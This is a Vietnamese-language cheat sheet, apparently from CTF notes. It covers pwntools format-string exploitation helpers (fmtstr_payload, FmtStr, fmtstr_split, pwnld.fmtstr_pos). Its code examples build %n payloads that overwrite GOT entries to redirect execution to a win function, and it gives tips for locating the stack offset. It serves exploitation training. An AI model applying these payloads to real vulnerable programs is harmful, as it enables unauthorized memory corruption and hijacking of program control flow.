# fmt — format string

Dựng payload `%n` ghi giá trị vào địa chỉ **mà không cần tự tính pad/thứ tự byte**.

> Hai tình huống khác nhau:
> - **Biết địa chỉ đích** (GOT, ret) → `fmtstr_payload` / `FmtStr` (nhúng địa chỉ vào payload).
> - **Con trỏ đích đã nằm sẵn trên stack** (ghi xuyên) → [`pwnld.fmtstr_pos`](../../../tools/pwnld.md#5-ghi-bằng-format-string-fmt).

---

## `fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`

**Công dụng:** sinh chuỗi `%n` ghi `{địa_chỉ: giá_trị}`; **nhúng địa chỉ đích vào payload** và tự
trỏ `%N$` tới chúng. **Dạng bài:** fmt bug với buffer **trên stack** (địa chỉ nhúng được đọc lại).

| Tham số | Ý nghĩa |
|---------|---------|
| `offset` | ô stack nơi **payload của bạn** bắt đầu (dò bằng `%p.%p...` hoặc `FmtStr`) |
| `writes` | dict `{addr: value}` — ghi nhiều đích cùng lúc |
| `numbwritten` | số ký tự printf **đã in trước** payload (prompt bị `%n` đếm chung) → trừ pad |
| `write_size` | `'byte'`\|`'short'`\|`'int'` = chia theo `%hhn`\|`%hn`\|`%n`. `'byte'` an toàn nhất |

```python
# ghi đè GOT: puts -> win
payload = fmtstr_payload(6, {exe.got.puts: exe.sym.win})

# nhiều đích cùng lúc
payload = fmtstr_payload(6, {exe.got.a: 0xdead, exe.got.b: 0xbeef})

# prompt in "Name: " (6 ký tự) TRƯỚC khi tới %n -> trừ vào pad
sa("Name: ", b"")
payload = fmtstr_payload(6, {exe.got.exit: exe.sym.win}, numbwritten=len("Name: "))

# write_size: 'byte' chia nhỏ (pad ít, ít kẹt), 'int' ghi 1 phát (pad to)
payload = fmtstr_payload(6, {addr: 0xdeadbeef}, write_size='byte')
```

> pwntools tự **append địa chỉ đích** vào cuối payload và tính lại chỉ số `%N$` cho đúng ô
> chứa chúng (vd truyền `offset=6` nhưng chuỗi sinh ra có thể là `%...%8$lln` vì con trỏ nằm
> sau phần format). Không cần tự căn.

**Bản làm tay (rất mệt):**
```python
# tự xếp: in pad tới byte đích, %hhn, cộng dồn số đã in, sắp địa chỉ tăng dần, chèn p64(addr)...
writes = {exe.got.puts: exe.sym.win}
# -> hàng chục dòng tính pad từng byte + thứ tự. fmtstr_payload gói hết.
```

---

## `FmtStr(execute_fmt, offset=None)` — tự dò offset + ghi nhiều lần

**Công dụng:** đóng gói fmt bug thành đối tượng: **tự dò `offset`** rồi cho `.write(addr, data)`
tích luỹ, `.execute_writes()` gửi. **Dạng bài:** bài cho **nhiều lần** nhập fmt (vòng lặp).

| Tham số | Ý nghĩa |
|---------|---------|
| `execute_fmt` | hàm `f(payload)->output`: gửi payload, trả về cái binary in ra |
| `offset` | offset nếu đã biết (bỏ trống để tự dò) |
| `padlen` / `numbwritten` | đệm/số đã in như trên |

```python
def send_fmt(s):
    p.sendlineafter(b"> ", s)
    return p.recvline()

fmt = FmtStr(send_fmt)           # tự dò offset bằng cách gửi thử
fmt.write(exe.got.puts, exe.sym.win)
fmt.write(exe.got.exit, exe.sym.main)
fmt.execute_writes()             # gửi payload ghi cả hai
```

---

## `fmtstr_split` — lấy phần tử thô

**Công dụng:** trả về `(pad_fmt, addresses)` để **tự ghép** khi cần kiểm soát layout.
**Dạng bài:** payload có ràng buộc vị trí đặc biệt (địa chỉ phải để chỗ khác).

```python
offset = 6
fmt, addrs = fmtstr_split(offset, {exe.got.puts: exe.sym.win}, write_size='short')
payload = fmt + addrs            # tương đương fmtstr_payload, nhưng tách được 2 phần
```

---

## Ghi XUYÊN con trỏ có sẵn → dùng `pwnld.fmtstr_pos`

Khi buffer **không** nằm trên stack (vd trên heap) thì không nhúng được địa chỉ cho
`fmtstr_payload`. Lúc đó mượn con trỏ **đã có sẵn** trên stack:

```python
from pwnld import fmtstr_pos
payload = fmtstr_pos(38, exe.address + 0x2f0)     # %<pad>c%38$hn
```

Chi tiết (short/full, chaining, star, consumed): [tools/pwnld.md](../../../tools/pwnld.md#5-ghi-bằng-format-string-fmt).

---

## Mẹo nhanh

- Dò `offset`: gửi `b"AAAAAAAA" + b".%p"*20`, đếm ô thứ mấy in ra `0x4141414141414141`.
- `write_size='byte'` an toàn nhất (pad nhỏ, ít kẹt byte xấu) nhưng payload dài; `'int'` ngắn
  nhưng pad có thể hàng tỉ ký tự.
- Buffer **trên stack** → `fmtstr_payload`. Buffer **trên heap**/con trỏ có sẵn → `fmtstr_pos`.
- Có `numbwritten` khi prompt/ký tự in **trước** `%n` (nếu không, pad lệch → ghi sai).
